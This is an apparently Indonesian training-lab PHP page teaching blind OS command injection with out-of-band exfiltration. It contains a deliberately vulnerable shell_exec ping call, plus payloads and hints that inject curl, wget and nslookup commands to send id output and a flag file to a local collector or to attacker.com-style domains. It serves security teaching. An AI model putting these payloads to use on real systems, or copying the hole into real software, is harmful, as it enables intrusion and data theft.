<?php
$active   = 'advanced-2';
$host     = $_POST['host'] ?? '';
$output   = '';
$executed = false;

function safe($s){ return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }

// Simulasi OOB log — catat request yang masuk ke "attacker server"
$oob_log_file = '/tmp/oob_requests.log';
$oob_entries  = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST' && $host !== '') {
    $executed = true;
    // VULNERABLE: blind injection — tidak ada output ke browser
    $cmd = "ping -c 1 " . $host . " > /dev/null 2>&1";
    shell_exec($cmd);
    // Tidak ada output yang dikembalikan
}

// Baca OOB log jika ada
if (file_exists($oob_log_file)) {
    $lines = file($oob_log_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach (array_reverse($lines) as $line) {
        $oob_entries[] = $line;
    }
}

// Simulasi "attacker server" endpoint — menerima data melalui GET parameter
if (isset($_GET['data'])) {
    $received = date('Y-m-d H:i:s') . ' | DATA: ' . substr(strip_tags($_GET['data']), 0, 500);
    file_put_contents($oob_log_file, $received . PHP_EOL, FILE_APPEND);
    header('HTTP/1.1 200 OK');
    exit('OK');
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Advanced 2: Blind CMDi + OOB — IDN Lab</title>
<?php include '../includes/shared_css.php'; ?>
</head>
<body>
<?php include '../includes/nav.php'; ?>

<div class="phdr">
  <div class="phdr-in">
    <div class="bc"><a href="/">Dashboard</a><span class="bc-sep">/</span><span>Advanced 2: Blind CMDi + OOB</span></div>
    <h1>Blind CMDi + Out-of-Band Exfiltration <span class="tag r">ADVANCED 2</span></h1>
    <p class="phdr-desc">Output tidak tersedia dan tidak ada delay yang terukur. Gunakan teknik Out-of-Band (OOB) untuk mengekstrak data dari server melalui channel komunikasi terpisah — DNS query atau HTTP callback.</p>
  </div>
</div>

<div class="wrap">

  <div class="box">
    <div class="box-t">Objectives</div>
    <ul class="obj-list">
      <li><div class="obj-n">1</div><span>Pahami konsep OOB exfiltration: data dikirim ke server attacker, bukan dikembalikan ke browser</span></li>
      <li><div class="obj-n">2</div><span>Gunakan <code class="ic">curl</code> untuk mengirim output command ke endpoint HTTP attacker yang tersedia di modul ini</span></li>
      <li><div class="obj-n">3</div><span>Eksfiltrasi hasil <code class="ic">id</code> dan isi <code class="ic">/var/private/flag.txt</code> ke OOB collector</span></li>
      <li><div class="obj-n">4</div><span>Gunakan DNS sebagai channel alternatif dengan <code class="ic">nslookup</code> dan subdomain encoding</span></li>
    </ul>
  </div>

  <div class="box">
    <div class="box-t">Vulnerability Context</div>
    <div class="qbox"><div class="ql">Blind Injection — Tidak Ada Output</div><span class="val">$cmd</span> = <span class="str">"ping -c 1 "</span> . <span class="val">$host</span> . <span class="str">" > /dev/null 2>&1"</span>;
<span class="at">shell_exec</span>(<span class="val">$cmd</span>);
<span class="cm">// Seluruh output dibuang — tidak ada yang bisa dibaca dari response HTTP</span>
<span class="cm">// Solusi: kirim data ke server yang kita kontrol melalui channel lain</span></div>
  </div>

  <!-- OOB Concept -->
  <div class="box">
    <div class="box-t">Out-of-Band Concept</div>
    <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:10px">
      <?php
      $concepts = [
        ['HTTP Callback','Gunakan curl/wget untuk mengirim data ke HTTP server attacker','var(--blue)','GET /collect?data=$(id) HTTP/1.1'],
        ['DNS Exfiltration','Encode data sebagai subdomain dalam DNS query yang keluar','var(--orange)','nslookup $(id).attacker.com'],
        ['File Write','Tulis ke file yang bisa diakses via web atau path lain','var(--green)','id > /var/www/html/out.txt'],
      ];
      foreach ($concepts as $c): ?>
      <div style="background:var(--el);border:1px solid var(--bd);border-radius:var(--r);padding:14px">
        <div style="font-size:.78rem;font-weight:700;color:<?= $c[2] ?>;margin-bottom:6px"><?= $c[0] ?></div>
        <div style="font-size:.75rem;color:var(--t2);line-height:1.6;margin-bottom:8px"><?= $c[1] ?></div>
        <code style="font-size:.7rem;font-family:var(--mono);color:var(--t3)"><?= $c[3] ?></code>
      </div>
      <?php endforeach; ?>
    </div>
  </div>

  <div class="box">
    <div class="box-t">Blind Ping Tool</div>
    <form method="POST" action="/advanced-2/">
      <div class="fg">
        <label class="fl">Host <span style="color:var(--red);font-size:.65rem">(output tidak ditampilkan)</span></label>
        <input class="fi" type="text" name="host"
          value="<?= safe($host) ?>"
          placeholder="Masukkan OOB payload...">
      </div>
      <div style="display:flex;gap:10px">
        <button type="submit" class="btn btn-r">Execute</button>
        <?php if($executed): ?><a href="/advanced-2/" class="btn btn-g">Reset</a><?php endif; ?>
      </div>
    </form>
    <?php if ($executed): ?>
    <div class="alert a-info" style="margin-top:12px;margin-bottom:0">Request diproses. Tidak ada output yang dikembalikan — periksa OOB Collector di bawah.</div>
    <?php endif; ?>
  </div>

  <!-- OOB Collector (simulasi attacker server) -->
  <div class="box">
    <div class="box-t">OOB Collector
      <span style="font-size:.65rem;font-weight:400;color:var(--t3);margin-left:4px">&mdash; Simulasi attacker server yang menerima data</span>
    </div>
    <p class="prose" style="margin-bottom:12px">Endpoint kolektor tersedia di URL ini. Kirim data dengan parameter <code class="ic">?data=</code>:</p>
    <div class="qbox" style="margin-bottom:12px;color:var(--blue)"><div class="ql">OOB Endpoint URL</div>http://127.0.0.1/advanced-2/?data=[EXFILTRATED_DATA]</div>

    <?php if (!empty($oob_entries)): ?>
    <div class="term-hdr">
      <span class="term-dot" style="background:#e63946"></span>
      <span class="term-dot" style="background:#f59e0b"></span>
      <span class="term-dot" style="background:#22c55e"></span>
      <span class="term-title">Received Data — <?= count($oob_entries) ?> entri</span>
    </div>
    <div class="terminal" style="border-top-left-radius:0;border-top-right-radius:0"><?php foreach($oob_entries as $e) echo safe($e) . "\n"; ?></div>
    <?php if (collect_has_flag($oob_entries ?? [])): ?>
    <div class="alert a-ok"><strong>FLAG diterima via OOB channel.</strong></div>
    <?php endif; ?>
    <form method="POST" action="/advanced-2/" style="margin-top:8px">
      <input type="hidden" name="host" value="">
      <button type="button" onclick="clearLog()" class="btn btn-g" style="font-size:.75rem;padding:7px 14px">Clear Log</button>
    </form>
    <?php else: ?>
    <div style="background:var(--el);border:1px solid var(--bd);border-radius:var(--r);padding:14px 18px;font-size:.82rem;color:var(--t3);font-family:var(--mono)">
      Belum ada data yang diterima. Gunakan payload curl untuk mengirimkan data ke endpoint ini.
    </div>
    <?php endif; ?>
  </div>

  <div class="box">
    <div class="box-t">Payload Reference</div>
    <div class="qbox"><div class="ql">OOB payload yang dapat dicoba</div><span class="cm">-- HTTP callback via curl: kirim output id ke collector</span>
8.8.8.8<span class="kw">;</span> curl <span class="str">"http://127.0.0.1/advanced-2/?data=$(id)"</span>

<span class="cm">-- Kirim isi file flag</span>
8.8.8.8<span class="kw">;</span> curl <span class="str">"http://127.0.0.1/advanced-2/?data=$(cat /var/private/flag.txt)"</span>

<span class="cm">-- Encode dengan base64 agar spesial karakter tidak merusak URL</span>
8.8.8.8<span class="kw">;</span> curl <span class="str">"http://127.0.0.1/advanced-2/?data=$(cat /var/private/flag.txt | base64)"</span>

<span class="cm">-- DNS exfiltration via nslookup (data menjadi subdomain)</span>
8.8.8.8<span class="kw">;</span> nslookup <span class="str">$(whoami).attacker.lab</span>

<span class="cm">-- Alternatif dengan wget</span>
8.8.8.8<span class="kw">;</span> wget -q <span class="str">"http://127.0.0.1/advanced-2/?data=$(id)"</span></div>
  </div>

  <div class="box">
    <div class="box-t">Hints</div>
    <details class="hint">
      <summary>Hint 1 &mdash; Cara kerja OOB</summary>
      <div class="hint-body">Alih-alih menampilkan output ke browser, data dikirim ke server lain yang kita kontrol. Dalam skenario nyata, attacker menyiapkan HTTP server atau listener DNS. Di lab ini, endpoint <code class="ic">?data=</code> di modul ini sendiri berperan sebagai collector.</div>
    </details>
    <details class="hint">
      <summary>Hint 2 &mdash; Payload curl dasar</summary>
      <div class="hint-body">Masukkan di field host:<br><code class="ic">8.8.8.8; curl "http://127.0.0.1/advanced-2/?data=$(id)"</code><br>Submit, kemudian refresh halaman untuk melihat data yang diterima di OOB Collector.</div>
    </details>
    <details class="hint">
      <summary>Hint 3 &mdash; Eksfiltrasi flag</summary>
      <div class="hint-body"><code class="ic">8.8.8.8; curl "http://127.0.0.1/advanced-2/?data=$(cat /var/private/flag.txt)"</code><br>Jika flag mengandung spesial karakter, encode dengan base64 terlebih dahulu dan decode di sisi collector.</div>
    </details>
    <details class="hint">
      <summary>Hint 4 &mdash; DNS vs HTTP exfiltration</summary>
      <div class="hint-body">HTTP exfiltration lebih mudah dan dapat membawa lebih banyak data. DNS exfiltration lebih tersembunyi karena DNS query sering diizinkan bahkan di jaringan yang sangat terbatas — hanya DNS yang diizinkan keluar. Attacker menggunakan domain yang mereka kontrol dan memantau query yang masuk.</div>
    </details>
  </div>

</div>

<?php
function collect_has_flag(array $entries): bool {
    foreach ($entries as $e) {
        if (str_contains($e, 'FLAG{')) return true;
    }
    return false;
}
?>

<script>
function clearLog() {
    fetch('/advanced-2/?clearlog=1').then(() => location.reload());
}
</script>

<?php
// Handle clear log request
if (isset($_GET['clearlog']) && file_exists($oob_log_file)) {
    unlink($oob_log_file);
    header('HTTP/1.1 200 OK');
}
?>

<?php include '../includes/footer.php'; ?>
</body>
</html>
